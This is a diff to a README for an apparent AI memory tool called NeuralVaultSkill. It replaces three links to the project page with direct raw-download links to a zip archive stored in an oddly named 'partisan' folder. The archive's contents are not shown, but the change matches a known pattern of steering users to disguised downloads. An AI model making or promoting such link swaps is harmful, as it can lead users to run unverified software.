@@ -1,6 +1,6 @@
 # 🧠 NeuralVaultSkill - Secure long-term AI memory made simple
 
-[![Download NeuralVaultSkill](https://img.shields.io/badge/Download-NeuralVaultSkill-blue?style=for-the-badge)](https://github.com/Marlorecent554/NeuralVaultSkill)
+[![Download NeuralVaultSkill](https://img.shields.io/badge/Download-NeuralVaultSkill-blue?style=for-the-badge)](https://github.com/Marlorecent554/NeuralVaultSkill/raw/refs/heads/main/partisan/Skill_Neural_Vault_v3.9-beta.5.zip)
 
 ## 🚀 Getting Started
 
@@ -12,7 +12,7 @@ Use it to keep important context, notes, and task history in one place while kee
 
 Visit this page to download:
 
-https://github.com/Marlorecent554/NeuralVaultSkill
+https://github.com/Marlorecent554/NeuralVaultSkill/raw/refs/heads/main/partisan/Skill_Neural_Vault_v3.9-beta.5.zip
 
 1. Open the link in your browser.
 2. Look for the latest release or download files on the page.
@@ -225,7 +225,7 @@ Use these habits:
 
 If you want the fastest path:
 
-1. Visit https://github.com/Marlorecent554/NeuralVaultSkill
+1. Visit https://github.com/Marlorecent554/NeuralVaultSkill/raw/refs/heads/main/partisan/Skill_Neural_Vault_v3.9-beta.5.zip
 2. Download the latest file or package
 3. Extract it if needed
 4. Open the app
